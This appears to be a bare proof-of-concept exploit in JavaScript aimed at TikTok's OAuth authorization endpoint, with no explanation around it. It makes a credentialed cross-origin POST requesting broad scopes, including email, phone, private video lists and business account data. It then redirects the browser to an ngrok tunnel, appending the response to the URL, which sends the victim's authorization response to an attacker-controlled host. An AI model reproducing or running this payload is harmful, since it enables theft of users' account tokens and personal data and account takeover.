var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.email%2Ccomment.list%2Cbiz.account.email%2Cuser.account.configure%2Clive.list%2Ccomment.list.manage%2Cbiz.account.phone%2Cvideo.list.manage%2Cbizpartner.item.info%2Cvideo.list.no_watermark%2Cbizpartner.user.info%2Cbiz.account.info%2Cuser.info.showcase%2Cuser.info.phone%2Cvideo.list.private_ads.no_watermark&aid=1459&source=web&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flog%2F%3F_extra%3DcGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZmcm9tX3BhZ2U9bG9naW4mb3JpZ2luPWh0dHBzOi8vYWRzLnRpa3Rvay5jb20vaTE4bi9sb2dpbi8.%26amp%253BerrCode%3D6007062%26amp%253Berror%3Daccess_denied%26amp%253Berror_string%3Daccess_denied%26amp%253Blog_id%3D202307311046391DCAFBFD59DA91058E95%26amp%253Blog_id%3D202307311048504D96B9115A384E05BC61%26amp%253Bredirect%3Dhttps%2525253A%2525252F%2525252Fbusiness.tiktok.com%2525252Fselect%2525253Fsource%2525253DBC_home%25252526attr_source%2525253DBC_home%25252526redirect_from%2525253Dlogin%26amp%253Bregister_type%3D1%26amp%253Bstate%3Da339872cdaf17815c5828988d4f67847622a988e&state=a339872cdaf17815c5828988d4f67847622a988e");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send();

function reqListener() {
    location='//e5cc-202-162-37-174.ngrok-free.app/log?key='+this.responseText; 
};
